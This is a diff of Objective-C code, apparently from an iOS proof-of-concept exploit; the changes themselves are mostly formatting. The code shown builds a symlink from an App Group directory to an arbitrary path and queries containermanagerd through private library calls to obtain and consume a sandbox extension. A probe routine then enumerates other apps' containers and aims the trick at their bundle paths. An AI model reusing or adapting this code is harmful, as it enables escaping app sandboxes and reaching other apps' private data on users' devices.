@@ -99,17 +99,17 @@ int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool crea
         struct stat st;
         if (lstat(target.fileSystemRepresentation, &st) != 0) return -255; // Nothing exists at this path, and create_dir is false
     }
-    
+
     // Get the App Group's path
     // An App Group identifier you control is required for this
     NSFileManager *files = [NSFileManager defaultManager];
     NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier:group];
     if (!groupRoot) return -1; // App Group doesn't exist or we can't access it
-    
+
     // Resolve functions
     void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
     if (!mgr) return -2; // dlopen failed?
-    
+
     container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
     container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
     container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
@@ -123,14 +123,14 @@ int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool crea
         dlclose(mgr);
         return -2; // Failed to resolve a function (unsupported OS)
     }
-    
+
     // Create query
     void *query = query_create();
     if (!query) {
         dlclose(mgr);
         return -3; // Failed to create query
     }
-    
+
     // Set up query
     xpc_object_t identifier;
     query_set_class(query, 7); // We're only using class 7 here (appGroup), which goes to containermanagerd
@@ -142,14 +142,14 @@ int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool crea
     } else {
         query_set_flags(query, 0x0000008000000000ULL);
     }
-    
+
     // Set up symlink while preserving the app group's existing cache directory.
     if (!prepare_symlink(files, groupRoot, target)) {
         query_free(query);
         dlclose(mgr);
         return -4; // Failed to create symlink
     }
-    
+
     // Send our query over
     void *result = query_get_single_result(query);
     if (!result) {
@@ -165,20 +165,20 @@ int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool crea
         clean_symlink(group);
         return -6; // Kernel refused to issue a sandbox extension
     }
-    
+
     // Consume sandbox extension and clean up
     int64_t handle = consume_extension(token);
     query_free(query);
     free(token);
     dlclose(mgr);
     clean_symlink(group);
-    
+
     return handle;
 }
 
 NSString *worse_query_probe_bundle(NSString *bundleIdentifier, NSString *groupIdentifier) {
     NSString *identifierText = [bundleIdentifier stringByTrimmingCharactersInSet:
-        NSCharacterSet.whitespaceAndNewlineCharacterSet];
+                                                     NSCharacterSet.whitespaceAndNewlineCharacterSet];
     if (!identifierText.length) {
         return @"A bundle identifier is required.";
     }
@@ -186,7 +186,7 @@ NSString *worse_query_probe_bundle(NSString *bundleIdentifier, NSString *groupId
     void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
     if (!mgr) {
         return [NSString stringWithFormat:@"Could not load libsystem_containermanager: %s",
-                dlerror() ?: "unknown error"];
+                                          dlerror() ?: "unknown error"];
     }
 
     container_query_create_fn queryCreate = (container_query_create_fn)dlsym(mgr, "container_query_create");
@@ -209,16 +209,16 @@ NSString *worse_query_probe_bundle(NSString *bundleIdentifier, NSString *groupId
     }
 
     NSMutableArray<NSString *> *lines = [NSMutableArray arrayWithObjects:
-        [NSString stringWithFormat:@"Bundle container probe: %@", identifierText],
-        @"Testing focused application container classes 1 and 2.",
-        @"Only result paths and token presence are shown.", @"", nil];
+                                                            [NSString stringWithFormat:@"Bundle container probe: %@", identifierText],
+                                                            @"Testing focused application container classes 1 and 2.",
+                                                            @"Only result paths and token presence are shown.", @"", nil];
     NSUInteger resultCount = 0;
     NSUInteger tokenCount = 0;
 
     // Class 2 is the known app-data class. Class 1 is probed as the adjacent
     // application/bundle class. Avoid class 0: it means 'unset' and causes
     // container_query_get_single_result() to abort the process.
-    const uint64_t classes[] = { 1, 2 };
+    const uint64_t classes[] = {1, 2};
     const uint64_t flags[] = {
         0x0000000100000000ULL, // metadata/read query
         0x0000008100000000ULL, // read/write query used by container tools
@@ -226,34 +226,34 @@ NSString *worse_query_probe_bundle(NSString *bundleIdentifier, NSString *groupId
 
     for (NSUInteger classIndex = 0; classIndex < sizeof(classes) / sizeof(classes[0]); classIndex++) {
         for (NSUInteger flagIndex = 0; flagIndex < sizeof(flags) / sizeof(flags[0]); flagIndex++) @autoreleasepool {
-            void *query = queryCreate();
-            if (!query) continue;
+                void *query = queryCreate();
+                if (!query) continue;
 
-            xpc_object_t identifier = xpc_string_create(identifierText.UTF8String);
-            const xpc_object_t values[] = { identifier };
-            xpc_object_t identifiers = xpc_array_create(values, 1);
-            querySetClass(query, classes[classIndex]);
-            querySetIdentifiers(query, identifiers);
-            querySetFlags(query, flags[flagIndex]);
+                xpc_object_t identifier = xpc_string_create(identifierText.UTF8String);
+                const xpc_object_t values[] = {identifier};
+                xpc_object_t identifiers = xpc_array_create(values, 1);
+                querySetClass(query, classes[classIndex]);
+                querySetIdentifiers(query, identifiers);
+                querySetFlags(query, flags[flagIndex]);
 
-            void *result = queryGetSingleResult(query);
-            if (result) {
-                resultCount += 1;
-                const char *path = getPath(result);
-                char *token = copyToken(result);
-                if (token) tokenCount += 1;
-                NSString *pathText = path ? [NSString stringWithUTF8String:path] : @"<no path>";
-                [lines addObject:[NSString stringWithFormat:
-                    @"class=%llu flags=%@ path=%@ token=%@",
-                    (unsigned long long)classes[classIndex],
-                    flagIndex == 0 ? @"metadata" : @"read-write",
-                    pathText ?: @"<invalid UTF-8>",
-                    token ? @"YES" : @"NO"]];
-                free(token);
+                void *result = queryGetSingleResult(query);
+                if (result) {
+                    resultCount += 1;
+                    const char *path = getPath(result);
+                    char *token = copyToken(result);
+                    if (token) tokenCount += 1;
+                    NSString *pathText = path ? [NSString stringWithUTF8String:path] : @"<no path>";
+                    [lines addObject:[NSString stringWithFormat:
+                                                   @"class=%llu flags=%@ path=%@ token=%@",
+                                                   (unsigned long long)classes[classIndex],
+                                                   flagIndex == 0 ? @"metadata" : @"read-write",
+                                                   pathText ?: @"<invalid UTF-8>",
+                                                   token ? @"YES" : @"NO"]];
+                    free(token);
+                }
+
+                queryFree(query);
             }
-
-            queryFree(query);
-        }
     }
 
     // LaunchServices can often disclose an installed app's exact bundle URL even
@@ -274,12 +274,12 @@ NSString *worse_query_probe_bundle(NSString *bundleIdentifier, NSString *groupId
             if ([bundleURL isKindOfClass:NSURL.class] && bundleURL.isFileURL) {
                 [lines addObject:[NSString stringWithFormat:@"LaunchServices bundle path: %@", bundleURL.path]];
                 NSString *groupText = [groupIdentifier stringByTrimmingCharactersInSet:
-                    NSCharacterSet.whitespaceAndNewlineCharacterSet];
+                                                           NSCharacterSet.whitespaceAndNewlineCharacterSet];
                 if (groupText.length) {
                     int64_t exactPathHandle = worse_query(bundleURL.path, groupText, false, false);
                     [lines addObject:[NSString stringWithFormat:@"Exact-path worse_query result: %lld%@",
-                                      (long long)exactPathHandle,
-                                      exactPathHandle >= 0 ? @" (sandbox extension issued)" : @""]];
+                                                                (long long)exactPathHandle,
+                                                                exactPathHandle >= 0 ? @" (sandbox extension issued)" : @""]];
                     if (exactPathHandle >= 0) {
                         worse_query_release(exactPathHandle);
                     }
@@ -298,7 +298,7 @@ NSString *worse_query_probe_bundle(NSString *bundleIdentifier, NSString *groupId
 
     [lines addObject:@""];
     [lines addObject:[NSString stringWithFormat:@"Results: %lu; tokens: %lu.",
-                      (unsigned long)resultCount, (unsigned long)tokenCount]];
+                                                (unsigned long)resultCount, (unsigned long)tokenCount]];
     if (!resultCount) {
         [lines addObject:@"Neither application container class accepted this identifier."];
     } else if (!tokenCount) {
